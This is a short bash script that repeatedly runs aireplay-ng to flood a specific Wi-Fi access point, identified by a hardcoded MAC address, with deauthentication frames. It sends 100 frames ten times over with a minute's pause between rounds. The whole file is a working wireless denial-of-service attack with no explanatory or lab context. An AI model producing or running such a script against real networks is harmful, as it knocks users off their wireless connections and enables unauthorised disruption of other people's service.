#!/bin/bash


for in in {1..10}
do 
	aireplay-ng --deauth 100 -a 94:6a:b0:15:41:6a wlan0mon
	sleep 60s

done